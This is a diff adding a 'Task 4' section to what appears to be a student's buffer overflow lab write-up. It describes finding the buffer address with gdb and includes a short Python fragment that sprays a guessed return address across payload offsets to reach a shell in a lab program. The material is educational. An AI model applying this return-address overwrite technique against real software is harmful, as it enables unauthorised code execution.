@@ -99,3 +99,29 @@ Because the compilation and setup commands are already included in Makefile, we 
 
 ![CreateShell](../docs/week5/log5task2.png)
 
+
+
+
+# Task 4
+
+At the start of this task, we use gdb to find the buffer adress, ignoring the buffer size "160".
+
+![bufferadress](../docs/week5/logtask4(1).png)
+
+We only know that it is between 100 and 200 so we populate our ret variable with the values we got and define some bounds. Then we run this cycle to populate the 'content' array with the bytes from the 'ret' variable. 
+
+```
+ret    = 0xffffcac0 + start      # Change this number 
+lowerbound = 100
+upperbound = 200                        # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+temp = (ret).to_bytes(L,byteorder='little')
+
+for offset in range(lowerbound, upperbound + L, L):
+    content[offset:offset + L] = temp 
+```
+
+Finally, by running the exploit we ge access to the shell.
+
+![sucess](../docs/week5/logtask4(2).png)
